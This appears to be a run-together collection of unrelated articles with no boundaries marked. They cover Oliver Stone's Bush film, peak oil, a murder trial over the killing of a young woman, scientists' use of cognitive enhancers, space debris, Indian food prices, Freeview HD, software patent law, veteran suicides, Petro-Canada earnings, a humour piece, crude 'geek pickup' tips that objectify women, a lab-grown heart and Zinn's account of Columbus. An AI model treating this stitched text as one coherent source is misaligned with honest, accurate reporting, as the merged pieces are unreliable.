Like a bill being rapidly pushed through legislation , Oliver Stone ’s film about President George W. Bush is expected to begin shooting within a month with a goal toward being released before the president leaves office next January .
A person close to the film , who spoke on the condition of anonymity because plans were still being formalized , said Stone ’s “ W. ” will begin filming in late April in Shreveport , Louisiana .
The Academy Award - winning director only began shopping his script for financing in January , but has quickly captured the interest of investors and Hollywood .
Stone has said that the film , which will focus on the life and presidency of Bush , wo n’t be an anti-Bush polemic , but , as he told Daily Variety , “ a fair , true portrait of the man .
How did Bush go from being an alcoholic bum to the most powerful figure in the world ? ”
Representatives for Stone would not confirm reports in Variety and elsewhere about casting decisions because of unfinalized contracts .
Expected to play the president is Josh Brolin , who played another Texan in the Coen brothers ’ Oscar - winning “ No Country for Old Men . ”
Expected to portray First Lady Laura Bush is Elizabeth Banks , whose credits include “ The 40 Year - Old Virgin ” and the upcoming “ Zach and Miri Make a Porno . ”
“ W. ” will be Stone ’s third film dealing with presidential matters , following “ Nixon ” and “ JFK . ”
The filmmaker has been an outspoken critic of the administration ’s decision to invade Iraq .
A Hollywood firebrand , Stone ’s films also include the Vietnam sagas “ Born on the Fourth of July ” and “ Platoon , ” which won four Oscars including best picture and director , and 2006 ’s “ World Trade Center , ” about two policemen buried in the rubble of the towers after the Sept. 11 attacks .

Peak oil is the point in time at which the maximum global petroleum production rate is reached , after which the rate of production enters its terminal decline .
If global consumption is not mitigated before the peak , the availability of conventional oil will drop and prices will rise , perhaps dramatically .

The drunk teenager was among a gang of five who " savagely and mercilessly " attacked Sophie Lancaster , 20 , and her boyfriend , Preston Crown Court heard .
Miss Lancaster was begging the gang to stop beating Robert Maltby , 21 , when they turned on her in Stubbylee Park in Bacup , Lancashire , the jury was told .
The 15 - year - old , who can not be named because of his age , denies murder .
At an earlier hearing a 16 - year - old boy , who was aged 15 at the time of the attack , admitted Miss Lancaster 's murder and admitted attacking Mr Maltby .
The accused , and four other youths , two aged 17 and one 16 , have already pleaded guilty to grievous bodily harm to Mr Maltby .
The court heard Miss Lancaster 's facial injuries were so severe , paramedics did not know what sex she was .
Tests indicated she had been kicked and stamped to death , with the pattern of some footwear still on her head .
Miss Lancaster , a gap - year student , died two weeks after the attack .
It would appear that [ they ] were singled out , not for anything they had said or done , but because they dressed differently to the defendant and his friend
Michael Shorrock QC
Prosecuting
Prosecuting , Michael Shorrock QC told the court the young couple , from Bacup , were walking home from a friend 's house when they " fell into conversation " with a group of teenagers .
The talk was friendly and good - natured , the court heard , but five of a group of youths " turned " on Mr Maltby .
The accused had started the violence , with a flying kick to the head of Mr Maltby , the jury was told .
The gang , " encouraging each other and laughing " punched , stamped and jumped on his head until he was unconscious , Mr Shorrock said .
As Miss Lancaster kneeled down , cradling her boyfriend 's head on her lap and calling for help , the accused and the then 15 - year - old youth who has already pleaded guilty to murder , turned on her .
The second boy kicked her in the head , with the accused joining in , the court heard .
Robert Maltby suffered head injuries in the attack
Paramedics found the couple lying side by side , covered in blood and unconscious .
Mr Shorrock said the gang had turned on the young couple simply because they were Goths or " moshers " and dressed differently to them .
Mr Maltby survived the attack in August last year but has not made a full recovery .
He has no memory of the incident .
Mr Shorrock said the five , none of whom can be named , were " acting like a pack of wild animals " .
" The attack was totally unprovoked .
" It would appear that Mr Maltby and Miss Lancaster were singled out , not for anything they had said or done , but because they dressed differently to the defendant and his friend , " he said .
The case continues .
The sports world has been rocked by repeated doping scandals as athletes have availed themselves of sophisticated formulations of steroids , stimulants , and other drugs to get any edge they can in the face of fierce competition .
In an era of tight research budgets and journals that do n't even review the vast majority of manuscripts they receive , competition in the academic world can seem equally fierce .
If drugs exist that increase focus or reduce anxiety , they could certainly give an edge to people in the research community , and vague talk of their use by academics has apparently become common enough to spawn an elaborate April Fool 's joke : the NIH - sponsored World Anti-Brain Doping Agency .
Beyond the jokes , how real is the problem ?
It 's hard to tell , but Nature , spurred by a commentary on the topic that appeared in its pages in December , took a stab at finding out .
They commissioned an informal internet survey , open to the global scientific community , that surveyed the use of a number of drugs that enhance mental performance .
You may insert various caveats about a self - selected survey population here .
The group of over 1,400 respondents were heavily biased towards US - based researchers , who accounted for 70 percent of the results ; the next highest nation only registered as six percent of the survey population .
Those responding were widely spread across the scientific community ; three different fields registered in the teens , and the largest category was other at 35 percent .
Age was also broadly distributed .
Although the peak decade , 26 to 35 , accounted for 34 percent of the responses , those 55 to 65 had a significant presence in the survey population .
Almost 35 percent of them have taken Ritalin , Provigil , or beta blockers , and 60 percent of those were taking the drugs specifically for improving mental capacity instead of medical reasons .
The numbers varied a bit among the age categories , but there was no real trend ; those over 55 were about as likely to use them as those under 35 .
Ritalin was the most popular drug , but a number of respondents had sampled more than one .
The vast majority took them for improving memory or concentration , and the " other " response to that question handily beat combatting jetlag , which accounted for a small fraction of the responses .
Nearly half who used the drugs took them daily or weekly , while half reported unpleasant side effects ( the overlap between the two is n't clear ) .
There are a number of reasons to view this phenomenon as something a bit different from athletic doping .
Seminars are n't really a form of competition , yet they can still be crippled by a case of jetlag or stage fright that a one - time dose of these drugs could reduce or eliminate .
At least one stimulant that has significant effects on behavior — caffeine — is already widely used and abused by the scientific community , making the step up to more potent drugs a small one .
There 's also an altruistic motivation that can be hard to spot in the athletic world .
Nature quotes one researcher as saying , " As a professional , it is my duty to use my resources to the greatest benefit of humanity .
If ' enhancers ' can contribute to this humane service , it is my duty to do so . "
Nevertheless , it gets tough to draw sharp lines that separate the altruistic , innocuous , and selfish reasons for turning to these drugs .
Like other areas of society , however , the academic community will have to decide what it means to achieve success in part through chemical assistance , and whether that somehow alters the equations the research field is governed by .
The survey results will be made available once the article goes live .

The European Space Agency has just released images showing all the satellites and human - made debris now orbiting space as a result of 51 years of launching stuff since Sputnik .
That 's about 6,000 satellites up there — of which only 800 remain operational — plus thousands of other objects from launches and accidents .
According to their mindblowing simulations things are getting a lot worse :
About 50 percent of all trackable objects are due to in - orbit explosion events ( about 200 ) or collision events ( less than 10 ) .

Yes , we knew that there was a lot of crap out there , but not to this extent .
According to the ESA , this is really bad news and urgent measures are needed .
Explosions in space are not disastrous on their own , but because of the aftermath .
One example : a geostationary satellite travels at 6,213 miles per hour .
If it explodes , all the debris stays near the orbit , forming a cloud around the Earth within a few days , as this simulation shows :

The ESA is urging to introduce measures to mitigate this problem , like the complete depletion of fuel in rocket stages ( like some Delta launchers already do following NASA 's Procedural Requirements for Limiting Orbital Debris ) or returning objects to Earth once their mission is complete ( perhaps to destroy them on re-entry , ) just like SES Americom is going to do with their brand - new AMC - 14 .
This satellite failed to reach its projected altitude and now has to be splashed into the sea because of a dispute with Boeing , which wo n't let SES Americom use their patented recovery method to put the satellite into the right geostationary orbit .

While the idea of bringing back used stages and satellites back to Earth may seem too expensive , in the long run it 's clear that leaving all this trash up there is going to have huge consequences to the development of space exploration and colonization .
Those concepts may still seem science fiction for many , but as these simulations show , the current and future problem is very real , and could be extremely dangerous .

Most of the people in India are happy with the growth stories told to them by the government and corporate , however , realities are slightly different for poor and lower middle class of people .
Today , there are many executives and managers in corporate world , who are earning lakhs of rupees per month , but simultaneously , there are millions of people in India living under poverty line who are earning less than 100 rupees ( $ 2.5 ) per day .
While in just last three years , prices of most of the eatable items have seen 20 to 70 % increases in their basic price making it difficult for people to get necessary eatable items .
For example 1 litre of refined oil was costing only Rs 40 two years back and today , it is costing Rs 74 per litre .
This story is true for most of the basic eatable items .
On the other hand , there is hardly any increase in the earning of poor and lower middle class people , therefore , making life more difficult for them .
Though , government of India is successful in considerably decreasing the prices of electronic devices , cars , motorcycles , mobile phone etc , however , it do not have any control on these increasing prices of food items or it do not want to control it .
Though , central and state government run number of programs for providing subsidised food items to poor but due to wide spread corruption most of the people fail in receiving any help .
While lower middle class do have any help available for them because neither they are poor nor they have enough money .
In future also this trend will continue in same direction as there are many chances that per quintal prices of wheat increasing from Rs 1100 to Rs 1400 soon .
In last few years , various governments of India have only neglected the farmers of India and due to this large numbers of famers are leaving farming to work in other segment .
This trend is causing acute shortage of large number of eatable items like cereals , oil seeds etc and causing steep increase in their prices .
If government did not take necessary measures in future then it will become very difficult for large number of people live in India .

Planet Earth is one of the BBC's high definition TV productions Viewers will be able to watch high definition TV on Freeview from 2009 , broadcast watchdog Ofcom has confirmed .
Ofcom says new technologies as well as the effects of digital switchover will enable more channels , including HD services , to be broadcast .
But viewers who want to watch the new services , which will first appear in the north - west of England , will need an HD - ready TV and a new set - top box .
Up to four free HD channels will be broadcast , including the BBC 's service .
ITV , Channel 4 , Five and Welsh network S4C will be invited to bid for three slots in which they can broadcast high definition TV , or other new services .
Ofcom says the new services should add to the " range and diversity " of TV in the UK , and contribute to public service broadcasting .
Viewers will have to wait until analogue TV is switched off in their area before they can see the HD channels .
The last regions to change to all - digital signals , in 2012 , will be London , the north - east of England and Northern Ireland .
At present , viewers can only watch HD services via satellite or cable , with most paying a subscription .
Free satellite TV service Freesat , which will include HD services from the BBC and ITV , will launch later this year .
The new HD channels will be available free through ordinary aerials Ofcom chief executive Ed Richards called the change a " once in a lifetime opportunity " .
" It offers benefits for broadcasters - who will be able to launch new services without using any new spectrum - and viewers - who will have access to new channels and services on free - to - air , " he said .
Ofcom will change the way digital terrestrial television channels are arranged to clear the way for the new services .
They are arranged in six " multiplexes " - bundles of channels , each operated by different companies .
One of the multiplexes , currently run by the BBC , will be have its channels moved elsewhere to create space for high definition channels and other new services .
Each high definition channel takes up four to five times the space of a standard service .
New technology means each multiplex will be able to carry more channels , and once analogue TV is switched off , the quality of the signals will improve .

What are these ?
From whence does the law of what can be claimed in a patent derive ?
Legislative :
There is basically nothing .
To date , Congress has handed off this question to the other branches .
Executive :
There is the USPTO 's Manual of Patent Examination and Procedure ( MPEP ) , which is their attempt to interpret the existing judicial rulings in a coherent manner .
Judicial : Because the other branches are currently leaving it up to the courts , the existing law by which a claim is judged is entirely from the courts .
The Supreme Court made three rulings regarding whether software is patentable : Gottshalk v. Benson , Parker v. Flook , and Diamond v. Diehr .
These can easily be read as the Court dealing with the question of what is a general - purpose computer and how it differs from a patentable device .
The first two rulings stated , hands - down , that software should not be patentable , even if the mathematical formula embodied in the software is " useful " for human affairs , and even if there is a physical last step , which the Flook ruling called " post - solution applications of such a formula . "
The third ruling , Diamond v. Diehr , allowed a patent on complex machinery to stand .
The conclusion of the ruling is worth reading in its entirety , because it is the axis around which the " what is a general - purpose computer " definition revolves :
We have before us today only the question of whether respondents ' claims [ are ] patentable subject matter .
We view respondents ' claims as nothing more than a process for molding rubber products and not as an attempt to patent a mathematical formula .
We recognize , of course , that when a claim recites a mathematical formula ( or scientific principle or phenomenon of nature ) , an inquiry must be made into whether the claim is seeking patent protection for that formula in the abstract .
A mathematical formula as such is not accorded the protection of our patent laws , Gottschalk v. Benson , and this principle cannot be circumvented by attempting to limit the use of the formula to a particular technological environment .
Parker v. Flook .
Similarly , insignificant postsolution activity will not transform an unpatentable principle into a patentable process .
To hold otherwise would allow a competent draftsman to evade the recognized limitations on the type of subject matter eligible for patent protection .
[*]
On the other hand , when a claim containing a mathematical formula implements or applies that formula in a structure or process which , when considered as a whole , is performing a function which the patent laws were designed to protect ( e. g. , transforming or reducing an article to a different state or thing ) , then the claim satisfies the requirements of 101 .
Because we do not view respondents ' claims as an attempt to patent a mathematical formula , but rather to be drawn to an industrial process for the molding of rubber products , we affirm the [ validity of the patent ] .
The axis of the Diehr ruling is that " On the other hand " phrase on the starred line ( " [ * ] " ) .
The lines before stated software loaded onto a general - purpose computer is not what patents are about , and the line after the star states that when a device is transforming matter and curing rubber , then that 's a real live machine .
So far , it 's all wine and roses : we have a specific discussion of what can be claimed , and it excludes pure software on the one hand but allows a machine with task - specific code to be patented as a machine .
Omitting a ruling or three , the Court of Appeals for the Federal Circuit then took over .
I have nothing nice to say about the CAFC , so I wo n't say anything .
But these are the guys who ruled on In re Alappat , which I mention as the single thorn in our campaign 's side .
In re Alappat was yet another case over a software device , and the court used only the second half of the above Diamond v. Diehr ruling -- " patent laws were designed to protect ... transforming or reducing an article to a different state or thing ... " and pointed out that programming a stock computer with software creates a " new machine . "
After all , the memory on the computer is transformed to a different state .
That 's why we computer geeks call it a state machine .
In other words , they threw out the entire debate about distinguishing between a general - purpose computer or a specialized device , and just said it 's all patentable .
So once
In re Alappat was accepted , business method patents and tax loophole patents followed naturally .
By eliminating Diehr 's balance between " insignificant post solution activity " and bona fide machines , everything became patentable .
The important part of this narrative is that In re Alappat threw out the question of what is a general - purpose or special - purpose computer as just irrelevant and not worth debating .
And that , dear reader , is where software patents come from .
And that is why we must end software patents .
CBS : ' Stunning ' veteran suicide rate is twice that of non-veterans

A faster Raw Story goes into testing this month , but we 're short on funds : 952 readers needed to help close the gap !
The problem of suicide among veterans of the wars in Iraq and Afghanistan has recently been in the news , with the Department of Veteran Affairs promising to beef up its mental health services in response .
Veterans of previous conflicts continue to have problems as well , and the VA has estimated that a total of 5000 suicides among veterans can be expected this year .
However , CBS News has now completed a five - month study of death records for 2004 - 05 which shows that the actual figures are " much higher " than those reported by the VA .
Across the total US veteran population of 25 million , CBS found that suicide rates were more than twice as high as for non-veterans ( according to the Centers for Disease Control and Prevention , suicide accounted for 32,439 deaths in 2004 ) .
CBS spoke to the families of several veterans who killed themselves after returning from Iraq .
" The war did n't end for him when he came home , " said the mother of one soldier .
" I think he was being tormented and tortured by his experiences . "
Sen. Patty Murray ( D - WA ) told CBS , " That 's a lot of young men and women who 've gone to fight for us who 've come home and found themselves that lost . "

CALGARY–Petro-Canada reported a first - quarter profit of $ 1.1 billion , up from $ 590 million a year ago , as higher operating earnings offset losses on foreign currency translation of long - term debt .
The company 's earnings amounted to $ 2.22 per share , and compared with $ 1.19 per share in the same period of 2007 .
Operating earnings totalled $ 899 million , or $ 1.86 per share , compared with $ 580 million , $ 1.17 per share , in the same period last year .
Cash flow from operating activities before changes in non-cash working capital was $ 1.8 billion , up from $ 1.2 billion last year .
During the quarter , the Calgary - based company produced 427,000 barrels of oil equivalent per day , up from 405,000 in the same quarter last year .
Petro-Canada said the increase in net earnings stemmed from higher operating earnings " combined with the benefit associated with settling the Buzzard derivative contracts in the fourth quarter of 2007 . "
They were partially offset by losses on foreign currency translation of long - term debt and lower gains on asset sales .
The company also reported a quarterly dividend of 13 cents per share , payable on July 1 , same as last year .
Petro-Canada is one of Canada 's largest oil and gas companies , operating in both the upstream and downstream sectors of the industry in Canada and internationally .
We are gathered here , way far in the future , for the funeral of Jack Handey , the world ’s oldest man .
He died suddenly in bed , according to his wife , Miss France .
No one is really sure how old Jack was , but some think he may have been born as long ago as the twentieth century .
He passed away after a long , courageous battle with honky - tonkin ’ and alley - cattin ’ .
Even though Jack was incredibly old , he was amazingly healthy right up to the end .
He attributed this to performing his funny cowboy dance for friends , relatives , and people waiting for buses .
All agreed it was the most hilarious thing they had ever seen , and not at all stupid or annoying .
Jack ’s death has thrown the whole world into mourning , and not in a fakey , sarcastic way .
He was admired by people of all ages and stripes , and by all animals , including zebras .
Even monsters liked him .
He had his playful side and his serious side , but ninety - nine per cent of the time he had his “ normal ” side .
He started out life as a baby but worked his way up to an adult .
But even when he was a full - grown adult he never forgot that he was a baby .
His philosophy of life was a simple one .
“ I ’m - a no look - a for trouble , because - a trouble , she ’s - a no good , ” he would often say , in his beloved fake Italian accent .
He was quick with a laugh , but just as quick to point at what he was laughing at .
Children loved him , but not in the way his teen - age niece claimed .
He was always thinking of ways of helping people , and was wondering how he might do some of those things when he died .
Jack was an expert in so many fields , it ’s hard to say what he was best at : the arts , the sciences , or the businesses .
If you talked to him at a party , you could n’t tell ; he seemed to know it all .
He has been compared to Captain James Cook , and not just because he was severely beaten by some Hawaiians , and to General Dwight D. Eisenhower , and not just because he liked to be driven around in a jeep .
As hard as it is to believe , he never sold a single painting during his lifetime , or even painted one .
Some of the greatest advances in architecture , medicine , and theatre were not opposed by him , and he did little to sabotage them .
Although he lived in Paris , in a mansion famous for its many trapdoors , he was always proud to be an American .
However , he was ashamed to be an earthling .
He was fabulously wealthy , but he would pretend to be broke , and often tried to borrow cigarettes and money from people .
Little did they know that those who gave him stuff would later be rewarded in his will , with jewels and antigravity helmets .
Women who refused to have sex with him are probably wishing that they could turn back the clock and say yes .
Generous even with his organs , he has asked that his eyes be donated to a blind person .
Also his glasses .
His skeleton , equipped with a spring that will suddenly propel it to a full standing position , will be used to educate kindergartners .
He has asked that no shrines be built to him .
But he pointed out that this did not mean he did n’t like Shriners .
According to our scientists , with their electronic soul trackers , Jack is in Heaven now .
And not just regular Heaven , which any jerk can get into , but special secret Heaven , which even some angels do n’t know about .
So let us celebrate his death , and not mourn .
However , those who appear to be a little too happy will be asked to leave .
Perhaps the greatest tragedy is that a lot of the things Jack said and did seemed wrong at the time , but now we realize it was n’t him ; it was we who were wrong .
Let us hope we do n’t make the same mistake with his clones .
In closing , it is unfortunate that Jack ’s friend Don could not be here .
However , Don died many years ago , from a horrible fungus .
And now robot Elton John will sing “ Candle in the Wind . ” ♦
Unless you ’ve been living under a virtual rock , you ’ve heard the meme bouncing around the Internet about how girls love Geeks .
We published the 12 Reasons a Geek Will Steal Your Girlfriend in 2008 last month , but wanted to put something together for the geeks out there who may be feeling left out , or who may be thinking “ where is all this love for geeks ?
I ’m certainly not seeing any movement in my Action - O - Meter … how can I get a piece of that ? ”
With that in mind , we proudly present Geeky Tips for Picking Up Chicks .
We ’re not giving away all our secrets , but these basics should be enough to get you started … and you can begin milking your geekiness for all the sweet ass it ’s worth .
• Leave no stone unturned in the hunt for geekophilic females
Before you can sweep girls off their feet with your dazzling knowledge of Star Wars trivia , you ’ve got to find them .
You could hit up the standard nightclubs and bars , but those settings are n’t particularly conducive for fully deploying the Geek ’s Girl - Getting Toolbox .
Your best bet is to frequent places with a high concentration of geek - friendly girls .
Here are a few good places to start your search :
– MMOGs – Seriously .
MMOGs , or Massive Multiplayer Online Video Games , are a buzzing hive of Geekdom and have actually attracted a sizable female population .
The problem for girls online is that guys playing games like WoW , Eve Online , and Second Life act like complete asshats around them .
Whether they ’re asking girls “ Are you REALLY a girl ? ” over and over , kneeling to propose at their first meeting , or just reverting back to fourth - grade antics like boob jokes and ass grabbing , most dudes do not play it cool around pixelated chicks .
If you want a shot at pulling some Alliance tail , just do n’t be a jerk .
Treat women with respect and courtesy — it ’s good advice even when you ’re not trying to score .
Most girls also like guys with wealth and power , even in the online realm , so do n’t be afraid to break out your uber armor and weapons , gratuitously call out your guild bodyguards or buy her that pricey magic bow she ’s had her eye on in the marketplace .
Once you ’ve secured the affections of your online lady and verified that she ’s not really a guy , 600 lbs. , or one of those dudes from To Catch a Predator , a geeky sex - fueled weekend romp is but a $ 200 plane ticket away ; to say nothing of the regular Teamspeak heavy petting you ’ll enjoy .
– Blogger / Tweet Ups –
If you ’re lucky enough to live in a city with lots of bloggers and social - media types , you need to explore the world of online - to - real world meet ups .
Bloggers , Twitterers , and other online - media types like to get out from behind their keyboards every now then for a drink .
Find out where and when these events are happening and show up with your game face on .
Grab a nametag and start a’ mingling .
It ’s good to roll with a wingman or two at these events if you can , so you do n’t look desperate .
Talk about how revolutionary you think Twitter is , how big your RSS subscriber base is , and how WordPress totally owns the mess that is Drupal .
– Bookstores –
The bookstore scene is great because you can be selective about your targets based on the area of the store they are browsing .
The Fantasy / Sci-Fi section is an obvious choice , as is Computers and Programming and Photography and the Arts .
Spend some time cycling around the shelves on a Saturday afternoon and work your geeky mojo .
Sections to avoid meeting women in : self help , debt management and pregnancy health .
• Be smart .
Be funny .
Be funny and smart
Girls LOVE guys who can make them laugh .
Geek - loving girls love guys who can make them laugh AND think .
The tricky part is to sound simultaneously humble , smart , funny and confident .
Sly , self - depreciating humor lets her know you do n’t take yourself too seriously but that you ’re totally comfortable in your own skin .
Bonus points for landing a joke about Creative Commons .
• Do n’t be afraid to bling out your geek
Do n’t knock it - bling and flash work .
Pop out your scratch - less iPhone , check your binary watch for the time and work your pimpin ’ Swiss Army knife / USB Drive into the conversation .
The idea is to let her know you have enough income to pay for the finer gadgets in life ( read : shoes , designer handbags , diamond earrings ) while exhibiting your obvious knowledge of how to program the TiVo .
Girls like guys who enjoy spending money on the finer things in life , so make sure to drop lots of subtle hints that you are a provider , even if the only thing you ’re planning on providing is a night in the ol’ bone sack .
• It ’s all about the numbers , so talk to them all
Sometimes you can’t peg a geek - loving girl right away and have to do some conversational investigation .
Talk to women everywhere .
You ’re a hunter looking for the right female , the one who might think your collection of hand - painted Mech micros are cute ; the one who will cuddle up to watch your Firefly DVD ; the one who end up jumping on for a fun run while watching the crew of Serenity bash around in space .
Talking to women is just like Halo — you get better with practice .
• Be good about the follow up .
Be nice , and do n’t blow it for other geeks
An important piece of advice ?
Do n’t be a jerk .
If there ’s a sudden surge of Geeks plowing through women with one - night stands and treating their hookups badly after a little nookie it ’s going to make it a lot harder for the rest of us to keep this whole “ Geeks Are Sexy ” thing rolling .
Treat women with respect and do n’t tell them lies about wanting to get together again , when all you ’re planning on doing is slipping them a fake phone number .
Be nice !
After all , they just did a job on your knob .
The smart Geek also knows that bad word of mouth can kill future prospects .
So there you have it .
A golden elixir of tippery to help you score some geek - loving lady action .
Go forth , my horny army of code loving , Boing Boing reading , sarcastically cool Geeks .
Go forth … and prosper .
Oh and before we go , you ’ll be pleased to learn that we partnered with our friends from Dailyidea to bring you this excellent video accompaniment to the article .

University of Minnesota researchers have created a beating heart in the laboratory .
By using a process called whole organ decellularization , scientists from the University of Minnesota Center for Cardiovascular Repair grew functioning heart tissue by taking dead rat and pig hearts and reseeding them with a mixture of live cells .
" The idea would be to develop transplantable blood vessels or whole organs that are made from your own cells , " said Doris Taylor , Ph.D. , director of the Center for Cardiovascular Repair , Medtronic Bakken professor of medicine and physiology , and principal investigator of the research .
Nearly 5 million people live with heart failure , and about 550,000 new cases are diagnosed each year in the United States .
Approximately 50,000 United States patients die annually waiting for a donor heart .
While there have been advances in generating heart tissue in the lab , creating an entire 3 - dimensional scaffold that mimics the complex cardiac architecture and intricacies , has always been a mystery , Taylor said .
It seems decellularization may be a solution -- essentially using nature 's platform to create a bioartifical heart , she said .

Decellularization is the process of removing all of the cells from an organ -- in this case an animal cadaver heart -- leaving only the extracellular matrix , the framework between the cells , intact .
After successfully removing all of the cells from both rat and pig hearts , researchers injected them with a mixture of progenitor cells that came from neonatal or newborn rat hearts and placed the structure in a sterile setting in the lab to grow .
The results were very promising , Taylor said .
Four days after seeding the decellularized heart scaffolds with the heart cells , contractions were observed .
Eight days later , the hearts were pumping .
" Take a section of this ' new heart ' and slice it , and cells are back in there , " Taylor said .
" The cells have many of the markers we associate with the heart and seem to know how to behave like heart tissue . "
" We just took nature 's own building blocks to build a new organ , " said Harald C. Ott , M.D. , co-investigator of the study and a former research associate in the center for cardiovascular repair , who now works at Massachusetts General Hospital .
" When we saw the first contractions we were speechless . "
Researchers are optimistic this discovery could help increase the donor organ pool .

In general , the supply of donor organs is limited and once a heart is transplanted , individuals face life - long immunosuppression , often trading heart failure for high blood pressure , diabetes , and kidney failure , Taylor said .
Researchers hope that the decellularization process could be used to make new donor organs .
Because a new heart could be filled with the recipient 's cells , researchers hypothesize it 's much less likely to be rejected by the body .
And once placed in the recipient , in theory the heart would be nourished , regulated , and regenerated similar to the heart that it replaced .
" We used immature heart cells in this version , as a proof of concept .
We pretty much figured heart cells in a heart matrix had to work , " Taylor said .
" Going forward , our goal is to use a patient 's stem cells to build a new heart . "
Although heart repair was the first goal during research , decellularization shows promising potential to change how scientists think about engineering organs , Taylor said .
" It opens a door to this notion that you can make any organ : kidney , liver , lung , pancreas -- you name it and we hope we can make it , " she said .
Researchers of the Center for Cardiovascular Repair team were assisted in their study by researchers from the University of Minnesota Department of Biomedical Engineering , who helped analyze data .
The research will be published online in the January 13 issue of Nature Medicine .
The study was funded by the Medtronic Foundation Endowment and a faculty research development grant from the University of Minnesota Academic Health Center .
Arawak men and women , naked , tawny , and full of wonder , emerged from their villages onto the island 's beaches and swam out to get a closer look at the strange big boat .
When Columbus and his sailors came ashore , carrying swords , speaking oddly , the Arawaks ran to greet them , brought them food , water , gifts .
He later wrote of this in his log :
They ... brought us parrots and balls of cotton and spears and many other things , which they exchanged for the glass beads and hawks ' bells .
They willingly traded everything they owned ... .
They were well - built , with good bodies and handsome features ....
They do not bear arms , and do not know them , for I showed them a sword , they took it by the edge and cut themselves out of ignorance .
They have no iron .
Their spears are made of cane ... .
They would make fine servants ....
With fifty men we could subjugate them all and make them do whatever we want .
These Arawaks of the Bahama Islands were much like Indians on the mainland , who were remarkable ( European observers were to say again and again ) for their hospitality , their belief in sharing .
These traits did not stand out in the Europe of the Renaissance , dominated as it was by the religion of popes , the government of kings , the frenzy for money that marked Western civilization and its first messenger to the Americas , Christopher Columbus .
Columbus ⿻ wrote :
As soon as I arrived in the Indies , on the first Island which I found , I took some of the natives by force in order that they might learn and might give me information of whatever there is in these parts .
The information that Columbus wanted most was :
Where is the gold ?
He had persuaded the king and queen of Spain to finance an expedition to the lands , the wealth , he expected would be on the other side of the Atlantic - the Indies and Asia , gold and spices .
For , like other informed people of his time , he knew the world was round and he could sail west in order to get to the Far East .
Spain was recently unified , one of the new modern nation - states , like France , England , and Portugal .
Its population , mostly poor peasants , worked for the nobility , who were 2 percent of the population and owned 95 percent of the land .
Spain had tied itself to the Catholic Church , expelled all the Jews , driven out the Moors .
Like other states of the modern world , Spain sought gold , which was becoming the new mark of wealth , more useful than land because it could buy anything .
There was gold in Asia , it was thought , and certainly silks and spices , for Marco Polo and others had brought back marvelous things from their overland expeditions centuries before .
Now that the Turks had conquered Constantinople and the eastern Mediterranean , and controlled the land routes to Asia , a sea route was needed .
Portuguese sailors were working their way around the southern tip of Africa .
Spain decided to gamble on a long sail across an unknown ocean .
In return for bringing back gold and spices , they promised Columbus 10 percent of the profits , governorship over new - found lands , and the fame that would go with a new title : Admiral of the Ocean Sea .
He was a merchant 's clerk from the Italian city of Genoa , part - time weaver ( the son of a skilled weaver ) , and expert sailor .
He set out with three sailing ships , the largest of which was the Santa Maria , perhaps 100 feet long , and thirty - nine crew members .
Columbus would never have made it to Asia , which was thousands of miles farther away than he had calculated , imagining a smaller world .
He would have been doomed by that great expanse of sea .
But he was lucky .
One - fourth of the way there he came upon an unknown , uncharted land that lay between Europe and Asia - the Americas .
It was early October 1492 , and thirty - three days since he and his crew had left the Canary Islands , off the Atlantic coast of Africa .
Now they saw branches and sticks floating in the water .
They saw flocks of birds .
These were signs of land .
Then , on October 12 , a sailor called Rodrigo saw the early morning moon shining on white sands , and cried out .
It was an island in the Bahamas , the Caribbean sea .
The first man to sight land was supposed to get a yearly pension of 10,000 maravedis for life , but Rodrigo never got it .
Columbus claimed he had seen a light the evening before .
He got the reward .
So , approaching land , they were met by the Arawak Indians , who swam out to greet them .
The Arawaks lived in village communes , had a developed agriculture of corn , yams , cassava .
They could spin and weave , but they had no horses or work animals .
They had no iron , but they wore tiny gold ornaments in their ears .
This was to have enormous consequences : it led Columbus to take some of them aboard ship as prisoners because he insisted that they guide him to the source of the gold .
He then sailed to what is now Cuba , then to Hispaniola ( the island which today consists of Haiti and the Dominican Republic ) .
There , bits of visible gold in the rivers , and a gold mask presented to Columbus by a local Indian chief , led to wild visions of gold fields .
On Hispaniola , out of timbers from the Santa Maria , which had run aground , Columbus built a fort , the first European military base in the Western Hemisphere .
He called it Navidad ( Christmas ) and left thirty - nine crewmembers there , with instructions to find and store the gold .
He took more Indian prisoners and put them aboard his two remaining ships .
At one part of the island he got into a fight with Indians who refused to trade as many bows and arrows as he and his men wanted .
Two were run through with swords and bled to death .
Then the Nina and the Pinta set sail for the Azores and Spain .
When the weather turned cold , the Indian prisoners began to die .
Columbus 's report to the Court in Madrid was extravagant .
He insisted he had reached Asia ( it was Cuba ) and an island off the coast of China ( Hispaniola ) .
His descriptions were part fact , part fiction :
Hispaniola is a miracle .
Mountains and hills , plains and pastures , are both fertile and beautiful ... the harbors are unbelievably good and there are many wide rivers of which the majority contain gold .
. . .
There are many spices , and great mines of gold and other metals ....
The Indians , Columbus reported , " are so naive and so free with their possessions that no one who has not witnessed them would believe it .
When you ask for something they have , they never say no .
To the contrary , they offer to share with anyone .... "
He concluded his report by asking for a little help from their Majesties , and in return he would bring them from his next voyage " as much gold as they need ... and as many slaves as they ask . "
He was full of religious talk : " Thus the eternal God , our Lord , gives victory to those who follow His way over apparent impossibilities . "
Because of Columbus 's exaggerated report and promises , his second expedition was given seventeen ships and more than twelve hundred men .
The aim was clear : slaves and gold .
They went from island to island in the Caribbean , taking Indians as captives .
But as word spread of the Europeans ' intent they found more and more empty villages .
On Haiti , they found that the sailors left behind at Fort Navidad had been killed in a battle with the Indians , after they had roamed the island in gangs looking for gold , taking women and children as slaves for sex and labor .
Now , from his base on Haiti , Columbus sent expedition after expedition into the interior .
They found no gold fields , but had to fill up the ships returning to Spain with some kind of dividend .
In the year 1495 , they went on a great slave raid , rounded up fifteen hundred Arawak men , women , and children , put them in pens guarded by Spaniards and dogs , then picked the five hundred best specimens to load onto ships .
Of those five hundred , two hundred died en route .
The rest arrived alive in Spain and were put up for sale by the archdeacon of the town , who reported that , although the slaves were " naked as the day they were born , " they showed " no more embarrassment than animals . "
Columbus later wrote : " Let us in the name of the Holy Trinity go on sending all the slaves that can be sold . "
But too many of the slaves died in captivity .
And so Columbus , desperate to pay back dividends to those who had invested , had to make good his promise to fill the ships with gold .
In the province of Cicao on Haiti , where he and his men imagined huge gold fields to exist , they ordered all persons fourteen years or older to collect a certain quantity of gold every three months .
When they brought it , they were given copper tokens to hang around their necks .
Indians found without a copper token had their hands cut off and bled to death .
The Indians had been given an impossible task .
The only gold around was bits of dust garnered from the streams .
So they fled , were hunted down with dogs , and were killed .
Trying to put together an army of resistance , the Arawaks faced Spaniards who had armor , muskets , swords , horses .
